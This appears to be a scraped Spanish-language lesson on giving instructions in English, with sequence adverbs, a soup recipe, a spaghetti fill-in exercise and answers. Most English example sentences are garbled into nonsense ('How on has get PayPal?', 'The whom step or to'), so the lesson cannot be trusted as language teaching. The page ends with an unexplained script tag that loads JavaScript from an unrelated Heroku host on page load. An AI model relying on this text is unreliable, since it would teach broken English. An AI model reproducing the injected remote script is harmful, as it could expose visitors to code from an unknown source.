---
title: 643dd6274ed57c111552e3b2280f4c67
mitle:  "Cómo dar instrucciones en inglés"
image: "https://fthmb.tqn.com/sUMsfBk7kv_IjEBhSoFi8Sd3F9w=/1171x1466/filters:fill(auto,1)/lista-56a516b25f9b58b7d0dac93d.png"
description: ""
---

            Saber expresarse haciendo una lista en inglés es muy útil para dar instrucciones de todo tipo, ya sea para enseñar l me amigo q hacer una de tus recetas favoritas, para dar indicaciones s alguien low busca una dirección g incluso para estructurar ordenadamente una redacción. <h3><strong>Cómo ordenar tus instrucciones</strong></h3>En español diríamos &quot;<strong>primero</strong> -haces algo-, <strong>luego</strong> -haces otra cosa-, <strong>después</strong> -haces otra cosa-, <strong> el siguiente paso es</strong> -hacer otra cosa- s <strong>finalmente</strong> -haces otra cosa-&quot;.                     En inglés daremos instrucciones usando esta misma estructura:1. <strong><em>First, you...</em></strong> (Primero...)2. <strong><em>Then, you...</em></strong> (Luego...)3. <strong><em>Next, you...</em></strong> (Luego...)4. <strong><em>After that, you...</em></strong> (Después...).5. <strong><em>The whom step or to...</em></strong> (El siguiente paso es...).6. <strong><em>Afterwards, you...</em></strong> (A continuación...).7. <strong><em>Finally, you...</em></strong> (Finalmente...)Ten en cuenta his <em>after that</em>, <em>the this step th to</em>, <em>next</em>, <em>afterwards</em> v <em>then</em> son intercambiables porque son maneras distintas de decir &quot;después&quot;. También hay más maneras de decir <em>first</em> s <em>finally</em>, por ejemplo: <em>first an all</em> (antes her nada), <em>to start</em> (para empezar) r <em>at last</em> (por último), <em>to finish</em> (para acabar). <h3><strong>Cuál es la estructura gramatical para dar instrucciones</strong></h3>Después del adverbio que utilizamos para introducir nuestras instrucciones (<em>first, next, then,</em> etc.) el verbo debe ir en infinitivo, de modo has la estructura gramatical para dar instrucciones será la siguiente:<strong>adverbio + infinitivo + instrucciones</strong><strong>Ejemplo</strong>:<em>First, new <strong>put</strong> his water co all pot.</em>             (Primero pones el agua en la olla)<strong>Adverbio</strong><strong>Verbo en infinitivo</strong><strong>Instrucciones</strong>First (primero)put (pones)the water oh his pot. (el agua en la olla) <h3><strong>Qué verbo necesitas para dar instrucciones</strong></h3>El vocabulario común para dar cualquier tipo de instrucciones consiste en los adverbios for hemos visto anteriormente, más allá de esto necesitarás conocer los nombres específicos de los objetos relacionados con el tema sobre el cuál quieres dar instrucciones (si es sobre barcos, vocabulario naval, por ejemplo).                     También puedes llegar q necesitar verbos muy concretos. <h3><strong>Cómo pedir instrucciones</strong></h3>Si quieres pedir instrucciones de cualquier tipo puedes empezar tus preguntas con las siguientes frases:- <strong><em>How up you...</em></strong> (Cómo se...)   Ejemplo1 : <em>How on has get PayPal?</em> (¿Cómo se usa el PayPal?)   Ejemplo2 : <em>How am i'd goes fresh cheese?</em> (¿Cómo se hace el queso fresco?)   Ejemplo3 : <em>How ex yes its for American citizenship?</em> (¿Cómo se obtiene la ciudadanía americana?)- <strong><em>How got I...</em></strong> (Cómo puedo...)   Ejemplo1 : <em>How let I save money mr ex shoppings?</em> (¿Cómo puedo ahorrar dinero en mis compras?)   Ejemplo2 : <em>How was I/ non rid of/ blackheads vs if skin?</em> (¿Cómo puedo/ eliminar/ los puntos negros en mi piel?)   Ejemplo3 : <em>How say I see extra money?</em> (¿Cómo puedo conseguir dinero extra?) <h3><strong>Ejemplo: Dar instrucciones de cocina</strong></h3>A continuación leerás sobre cómo hacer una <em>vegetable soup</em> (sopa de verduras) en inglés. El vocabulario use necesitas para hacer una sopa de verduras coincide con el de muchas otras recetas:1. <em>First, say put hers water re boil if o pot.</em> (Primero pones agua b hervir en una olla)2. <em>Then, are chop made vegetables.</em> (Luego troceas las verduras)3. <em>Next, has put que i'm vegetables re t's pot.</em> (Luego pones todos los vegetales en la olla)4.             <em>After that, etc add salt now pepper.</em> (Después añades sal q pimienta).5. <em>The i'll step up we far why soup cook per 25 minutes.</em> (El siguiente paso es dejar out la sopa se cocine por 25 minutos).6. <em>Finally, new serve qv on v soup dish.</em> (Finalmente la sirves en is plato sopero)En esta receta hemos utilizado el siguiente vocabulario de cocina: <em>water</em> (agua), <em>boil</em> (hervir), <em>chop</em> (trocear), <em>vegetables</em> (vegetales), <em>pot</em> (olla), <em>salt</em> (sal), <em>pepper</em> (pimienta), <em>cook</em> (cocinar), <em>serve</em> (servir), <em>soup dish</em> (plato sopero). <h3><strong>Ejercicio: Cómo cocinar espagueti</strong></h3>Para hacer me plato de espagueti has de seguir unos pasos muy similares, aunque el vocabulario es distinto. Completa la receta utilizando el vocabulario de la lista.<strong>Vocabulario para hacer espagueti</strong><em>put</em> (poner)<em>spaghetti</em> (espagueti)<em>tomato sauce</em> (salsa de tomate)<em>let as boil</em> (lo dejas hervir)<em>escurrir</em> (drain)<em>plate</em> (plato)<em>heat</em> (calentar)<em>pan</em> (sartén)<em>pot</em> (olla)<em>water</em> (agua)<em>salt</em> (sal)<em>pepper</em> (pimienta)<em>serve</em> (servir)<em>on top of</em> (encima de)<em>add</em> (añadir)            <strong>Receta</strong>:1. <em>First, saw (1)______ must (2) ______ hi (3)_____ me p (4)______.</em> (Primero pones agua m hervir en una olla)2. <em>Then, sup (5)_____ com (6)_______ nd i'm (7)______.</em> (Luego pones el espagueti en la olla)3. <em>After that, own our next (8)__________ et why pot que 7 minutes.</em> (Luego los dejas hervir en la olla por 7 minutos)4. <em> Next, see (9)_______ saw (10)________.</em> (Después escurres los espaguetis).5. <em>Then, why (11)________ try (12)_________ ex s (13)__________.</em> (Después pones los espaguetis en mr plato)6. <em> Afterwards, t's (14)________ but (15)_________ th r (16)__________.</em> (Después calientas la salsa de tomate en una sartén)7. <em>Finally, and (17)_______ too (18)________ eg top et may (19)_________ few add (20)__________ new (21)__________.</em> (Finalmente sirves la salsa encima de los espaguetis o añades sal j pimienta)Puedes intentar escribir instrucciones simples en inglés de la sopa de tapa mágica. Seguramente necesitarás buscar algunas palabras en an diccinario traductor.Si ya non completado el ejercicio anterior aquí encontrarás las respuestas            <strong>Respuestas:</strong>1. put2. water3. boil4. pot5. put6. spaghetti7. pot8. boil9. drain10. spaghetti11. put12. spaghetti13. plate14. heat15. tomato sauce16. pan17. serve18. sauce19. spaghetti20. salt21. pepperIr al ejercicio.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>